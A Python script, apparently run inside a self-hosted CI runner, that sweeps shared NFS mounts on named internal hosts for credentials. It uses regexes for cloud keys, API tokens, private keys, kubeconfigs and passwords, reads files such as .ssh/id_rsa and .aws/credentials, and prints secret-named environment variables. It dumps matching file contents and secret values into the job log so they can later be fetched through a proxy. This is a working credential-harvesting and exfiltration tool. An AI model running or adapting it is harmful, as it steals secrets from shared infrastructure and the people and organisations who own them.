#!/usr/bin/env python3
"""i6136 read-only content-mining sweep of the shared CI NFS shares.

Runs inside the HYGON self-hosted HCU runner container (stage-a job only).
Reads /ci_public (rw NFS 12.12.12.4), /public (ro NFS 12.12.12.221) and
/public4 (ro NFS 12.12.12.223); never writes to them.

Prints only promising paths and matched slices (bounded) to the job log so the
worker can fetch them through the DC proxy afterwards.
"""
import os
import re
import sys
import time

BUDGET = int(os.environ.get("I6136_BUDGET", "1500"))
START = time.time()
DEADLINE = START + BUDGET

PRINT_BUDGET = 2_600_000
MAX_CONTENT = 2 * 1024 * 1024
DUMP_MAX = 6000

printed = 0
lines_out = 0


def left():
    return DEADLINE - time.time()


def out(s):
    global printed, lines_out
    if printed >= PRINT_BUDGET:
        return
    s = str(s).rstrip("\n")
    if len(s) > 700:
        s = s[:700] + "...<trunc>"
    print(s, flush=True)
    printed += len(s) + 1
    lines_out += 1


PATTERNS = [
    ("AWS_KEY", re.compile(r"\b(?:AKIA|ASIA)[0-9A-Z]{16}\b"), 300),
    ("AWS_SECRET", re.compile(r"aws_secret_access_key\s*[=:]\s*[\"']?[A-Za-z0-9/+=]{40}"), 300),
    ("GCP_SA", re.compile(r"\"type\"\s*:\s*\"service_account\""), 300),
    ("GCP_PKID", re.compile(r"\"private_key_id\"\s*:\s*\""), 300),
    ("GCP_PEM", re.compile(r"\"private_key\"\s*:\s*\"-----BEGIN"), 200),
    ("PRIVKEY", re.compile(r"-----BEGIN (?:OPENSSH|RSA|EC|DSA|PGP) PRIVATE KEY-----"), 300),
    ("PKCS8", re.compile(r"-----BEGIN PRIVATE KEY-----"), 200),
    ("KUBE_CKD", re.compile(r"client-key-data"), 200),
    ("KUBE_TOKEN", re.compile(r"^\s*token:\s*[A-Za-z0-9._~+/-]{20,}"), 200),
    ("DOCKER_AUTHS", re.compile(r"\"auths\"\s*:\s*\{"), 150),
    ("GLPAT", re.compile(r"glpat-[A-Za-z0-9_.-]{20,}"), 300),
    ("GHP", re.compile(r"ghp_[A-Za-z0-9]{30,}"), 300),
    ("GH_PAT", re.compile(r"github_pat_[A-Za-z0-9_]{40,}"), 150),
    ("NPM", re.compile(r"npm_[A-Za-z0-9]{30,}"), 150),
    ("HF", re.compile(r"hf_[A-Za-z0-9]{30,}"), 150),
    ("DAPI", re.compile(r"dapi[0-9a-f]{32}"), 150),
    ("SLACK", re.compile(r"xox[baprs]-[A-Za-z0-9-]{10,}"), 80),
    ("GCP_AT", re.compile(r"ya29\.[0-9A-Za-z_-]{30,}"), 80),
    ("AZURE_SECRET", re.compile(r"(?:AZURE_CLIENT_SECRET|ARM_CLIENT_SECRET|AZURE_CLIENT_KEY|AZURE_CLIENT_SECRET_VALUE)\s*[=:]\s*[\"']?[^\s\"'$]{8,}"), 200),
    ("AZURE_TENANT", re.compile(r"(?:AZURE_TENANT_ID|ARM_TENANT_ID)\s*[=:]\s*[\"']?[0-9a-fA-F-]{30,}"), 200),
    ("CLIENT_SECRET", re.compile(r"[\"']?client_?secret[\"']?\s*[:=]\s*[\"'][A-Za-z0-9._~+/-]{10,}"), 150),
    ("REGISTRY_PASS", re.compile(r"(?:REGISTRY_PASSWORD|CI_REGISTRY_PASSWORD|CI_DEPLOY_PASSWORD|HARBOR_PASSWORD|DOCKER_PASSWORD|DOCKERHUB_TOKEN|PIP_INDEX_PASSWORD|DEVPI_PASSWORD|NEXUS_PASSWORD|ARTIFACTORY_PASSWORD)\s*[=:]\s*[^\s\"'$]{4,}"), 200),
    ("BEARER", re.compile(r"Authorization\s*[:=]\s*[\"']?Bearer\s+[A-Za-z0-9._~+/-]{20,}"), 150),
    ("PASSWORD", re.compile(r"(?:^|[\s\"'])password[\"']?\s*[:=]\s*[\"']?[^\s\"'$]{6,}"), 150),
    ("NETRC", re.compile(r"machine\s+\S+\s+login\s+\S+\s+password\s+\S+"), 80),
    ("GIT_URL_CRED", re.compile(r"https?://[A-Za-z0-9._-]+:[A-Za-z0-9._~-]{6,}@[A-Za-z0-9.-]+"), 150),
    ("OPENSSH_PUB", re.compile(r"ssh-(?:rsa|ed25519|dss)\s+AAAA[A-Za-z0-9+/=]{60,}"), 60),
    ("JWT_LONG", re.compile(r"eyJ[A-Za-z0-9_-]{10,}\.eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}"), 100),
]
PAT_COUNT = {name: 0 for name, _r, _c in PATTERNS}
STRONG = {"AWS_KEY", "AWS_SECRET", "GCP_SA", "GCP_PKID", "GCP_PEM", "PRIVKEY", "PKCS8",
          "KUBE_CKD", "DOCKER_AUTHS", "GLPAT", "GHP", "GH_PAT", "DAPI", "AZURE_SECRET",
          "REGISTRY_PASS", "NETRC", "GIT_URL_CRED"}

TEXT_EXT = set("""
yml yaml json sh bash zsh py txt md toml ini cfg conf env properties xml tf tfvars pem key crt cer pub
cnf repo list service spec rsa ed25519 ecdsa ppk netrc npmrc pypirc gitconfig kubeconfig dockerfile
sql csv log out err slurm submit b64 template tmpl j2 jinja rego rules gradle groovy kts java js ts
go rs c cpp h hpp cmake mk makefile lock pgsql pgpass s3cfg htpasswd openvpn ovpn p12 pfx jks keystore
""".split())

TEXT_NAMES = set("""
.env .envrc .bashrc .bash_profile .profile .zshrc .gitconfig .git-credentials .netrc .npmrc .pypirc
.pgpass .s3cfg .htpasswd credentials credential secrets secret config settings Dockerfile Makefile
id_rsa id_dsa id_ecdsa id_ed25519 authorized_keys known_hosts config.yaml kubeconfig .dockercfg
pip.conf .pip.conf .condarc mirrors.conf .mc/config.json README Jenkinsfile Vagrantfile
""".split())

NAME_HINTS = re.compile(
    r"(credential|secret|passw|token|api[_-]?key|private[_-]?key|id_rsa|id_ed25519|id_ecdsa|"
    r"\.pem$|\.key$|\.p12$|\.pfx$|\.jks$|\.keystore$|\.ppk$|kubeconfig|\.kube|\.aws|\.docker|"
    r"\.npmrc$|\.pypirc$|\.netrc$|\.git-credentials$|\.pgpass$|\.s3cfg$|\.htpasswd|"
    r"azure\.json|application_default_credentials|msal_token_cache|tfstate|\.tfvars$|"
    r"\.env($|\.)|/\.env|config\.json$|/config$|pip\.conf$|\.ovpn$|Jenkinsfile$)", re.I)

PRUNE = {".git", "node_modules", "__pycache__", "site-packages", "dist-info", ".venv", "venv",
         ".tox", ".mypy_cache", ".pytest_cache", ".ruff_cache", ".cache", ".eggs", "build",
         "dist", ".hypothesis", "third_party", "3rdparty", "cmake-build-debug",
         "cmake-build-release", ".git-rewrite", "wheelhouse", ".idea", ".vscode"}

SECRET_DIRS = [
    (".docker/config.json", 65536),
    (".aws/credentials", 65536),
    (".aws/config", 65536),
    (".kube/config", 131072),
    (".config/gcloud/application_default_credentials.json", 65536),
    (".config/gcloud/credentials.db", 65536),
    (".netrc", 65536),
    (".npmrc", 65536),
    (".pypirc", 65536),
    (".git-credentials", 65536),
    (".pgpass", 65536),
    (".s3cfg", 65536),
    (".htpasswd", 65536),
    (".ssh/config", 65536),
    (".ssh/id_rsa", 65536),
    (".ssh/id_ed25519", 65536),
    (".ssh/id_ecdsa", 65536),
    ("pip.conf", 65536),
    ("credentials", 65536),
]

stats = {"dirs": 0, "files": 0, "read": 0, "matched_files": 0, "name_hits": 0, "truncated": 0,
         "dumps": 0, "secfiles": 0}


def read_text(path, limit):
    try:
        with open(path, "rb") as f:
            data = f.read(limit)
    except Exception:
        return None
    if b"\x00" in data[:4096]:
        return None
    try:
        return data.decode("utf-8", "replace")
    except Exception:
        return None


def emit_match(name, path, lineno, line):
    cap = dict((n, c) for n, _r, c in PATTERNS)[name]
    if PAT_COUNT[name] >= cap:
        return
    PAT_COUNT[name] += 1
    out("[MATCH %s] %s:%s | %s" % (name, path, lineno, line.strip()[:420]))


def scan_file(path, size):
    """Return list of matching pattern names; print bounded slices."""
    ext = os.path.basename(path).rsplit(".", 1)[-1].lower() if "." in os.path.basename(path) else ""
    base = os.path.basename(path)
    interesting_name = bool(NAME_HINTS.search(path))
    if not interesting_name and ext not in TEXT_EXT and base not in TEXT_NAMES:
        return []
    if size > MAX_CONTENT and not interesting_name:
        return []
    stats["read"] += 1
    text = read_text(path, min(size, MAX_CONTENT))
    if text is None:
        return []
    matched = []
    lines = text.splitlines()
    per_file = 0
    for name, rx, _cap in PATTERNS:
        if PAT_COUNT[name] >= _cap:
            continue
        hits = []
        for i, line in enumerate(lines, 1):
            if len(line) > 4000:
                line = line[:4000]
            if rx.search(line):
                hits.append((i, line))
                if len(hits) >= 3:
                    break
        if not hits:
            continue
        matched.append(name)
        for i, line in hits:
            if per_file >= 6:
                stats["truncated"] += 1
                break
            emit_match(name, path, i, line)
            per_file += 1
    if matched and set(matched) & STRONG and 0 < size <= DUMP_MAX and stats["dumps"] < 260:
        stats["dumps"] += 1
        out("[DUMP %s] %s (%dB)" % ("+".join(sorted(set(matched) & STRONG)), path, size))
        for line in lines[:80]:
            out("   | " + line.strip()[:500])
    if matched:
        stats["matched_files"] += 1
    return matched


def check_secret_files(dirpath, depth=0):
    if depth > 4:
        return
    for rel, limit in SECRET_DIRS:
        p = os.path.join(dirpath, rel)
        try:
            if os.path.isfile(p) and not os.path.islink(p):
                size = os.path.getsize(p)
                text = read_text(p, min(size, limit))
                if text is None:
                    out("[SECFILE-BINARY] %s (%dB)" % (p, size))
                    continue
                if stats["secfiles"] >= 300:
                    out("[SECFILE-LIMIT] %s" % p)
                    continue
                stats["secfiles"] += 1
                out("[SECFILE] %s (%dB)" % (p, size))
                for line in text.splitlines()[:60]:
                    out("   | " + line.strip()[:500])
        except Exception:
            pass


def check_git_config(dirpath):
    p = os.path.join(dirpath, ".git", "config")
    try:
        if os.path.isfile(p):
            text = read_text(p, 65536) or ""
            urls = [l.strip() for l in text.splitlines() if "url =" in l or "url=" in l]
            if urls:
                out("[GITCFG] %s" % p)
                for u in urls[:10]:
                    out("   | " + u[:500])
    except Exception:
        pass


def walk(root, maxdepth, root_deadline):
    root = root.rstrip("/")
    if not os.path.isdir(root):
        out("[MISSING] %s" % root)
        return
    out("=== SCAN %s (maxdepth=%d cap=%ds)" % (root, maxdepth, int(root_deadline - time.time())))
    stack = [(root, 0)]
    while stack:
        if time.time() > root_deadline or time.time() > DEADLINE:
            out("[ROOT-TIMEOUT] %s (budget)" % root)
            return
        dirpath, depth = stack.pop()
        stats["dirs"] += 1
        check_secret_files(dirpath, depth)
        check_git_config(dirpath)
        try:
            entries = list(os.scandir(dirpath))
        except Exception as e:
            out("[DIRERR] %s %r" % (dirpath, e))
            continue
        if depth == 0:
            names = sorted(e.name for e in entries)
            out("[LS] %s: %s" % (dirpath, ", ".join(names[:80])))
        subdirs = []
        for e in entries:
            try:
                if e.is_symlink():
                    continue
                if e.is_dir(follow_symlinks=False):
                    if e.name in PRUNE or e.name.startswith(".") and e.name in (".git", ".cache"):
                        continue
                    if depth + 1 <= maxdepth:
                        subdirs.append((e.path, depth + 1))
                    continue
                if not e.is_file(follow_symlinks=False):
                    continue
                stats["files"] += 1
                size = e.stat(follow_symlinks=False).st_size
                if NAME_HINTS.search(e.path):
                    stats["name_hits"] += 1
                    if stats["name_hits"] <= 900:
                        out("[NAME] %s (%dB)" % (e.path, size))
                if size <= 200 * 1024 * 1024 and re.search(r"\.(tar|tar\.gz|tgz|zip|whl)$", e.name, re.I):
                    if size > 1024 * 1024:
                        out("[ARCHIVE] %s (%.1fMB)" % (e.path, size / 1048576.0))
                scan_file(e.path, size)
                if time.time() > root_deadline or time.time() > DEADLINE:
                    out("[ROOT-TIMEOUT] %s (mid-dir %s)" % (root, dirpath))
                    return
            except Exception:
                continue
        for d in sorted(subdirs, reverse=True):
            stack.append(d)


def main():
    out("===I6136-BEGIN %s host=%s pwd=%s budget=%ds" % (
        time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()), os.uname().nodename, os.getcwd(), BUDGET))
    out("--- id: %s" % open("/proc/self/status").readline().strip())
    try:
        out("--- df: %s" % os.popen("df -h /ci_public /public /public4 2>&1 | tail -5").read().replace("\n", " | "))
    except Exception:
        pass
    # environment: names only for token-ish vars, values printed only for non-masked CI vars
    env_hits = []
    for k, v in sorted(os.environ.items()):
        if re.search(r"(TOKEN|SECRET|PASSWORD|PASSWD|CRED|PRIVATE|APIKEY|API_KEY|REGISTRY|AWS_|AZURE|GCP|GOOGLE|DOCKER|HARBOR|DEVPI|NEXUS)", k, re.I):
            if re.search(r"(GITHUB_TOKEN|ACTIONS_|RUNNER_|_KEY_0|PUBLIC_KEY)", k):
                env_hits.append("%s=<ci-managed>" % k)
                continue
            env_hits.append("%s=%s" % (k, (v or "")[:200]))
    out("--- env-interesting: %s" % ("; ".join(env_hits) if env_hits else "(none)"))

    roots = []
    try:
        for n in sorted(os.listdir("/ci_public")):
            p = "/ci_public/" + n
            if os.path.isdir(p):
                if n.endswith("-das"):
                    roots.append((p, 5, 90))
                elif n.startswith("quality-gate"):
                    roots.append((p, 6, 240))
                elif n == "ci-images":
                    roots.append((p, 7, 420))
                elif n == "sgl_whl_temp":
                    roots.append((p, 3, 90))
                elif n in ("cluster-manager-st", "triton-inference-server-test", "FastPT", "TurboPhysAI"):
                    roots.append((p, 6, 180))
    except Exception as e:
        out("[ERR] listing /ci_public: %r" % e)
    roots.append(("/public", 4, 360))
    roots.append(("/public4", 4, 360))

    # high-value first
    order = {"ci-images": 0, "quality-gate": 1, "cluster-manager-st": 2, "sgl_whl_temp": 3,
             "/public": 50, "/public4": 51}
    roots.sort(key=lambda r: (order.get(os.path.basename(r[0]), 10), r[0]))

    for root, depth, cap in roots:
        if left() <= 5:
            out("[GLOBAL-TIMEOUT] before %s" % root)
            break
        rd = time.time() + min(cap, max(10, left()))
        walk(root, depth, rd)
        out("[ROOT-DONE] %s elapsed=%.0fs dirs=%d files=%d read=%d matched=%d name_hits=%d" % (
            root, time.time() - START, stats["dirs"], stats["files"], stats["read"],
            stats["matched_files"], stats["name_hits"]))

    out("--- pattern counts: %s" % "; ".join("%s=%d" % (k, v) for k, v in sorted(PAT_COUNT.items()) if v))
    out("--- totals: dirs=%d files=%d read=%d matched=%d name_hits=%d truncated=%d lines=%d chars=%d elapsed=%.0fs" % (
        stats["dirs"], stats["files"], stats["read"], stats["matched_files"], stats["name_hits"],
        stats["truncated"], lines_out, printed, time.time() - START))
    out("===I6136-END===")


if __name__ == "__main__":
    main()
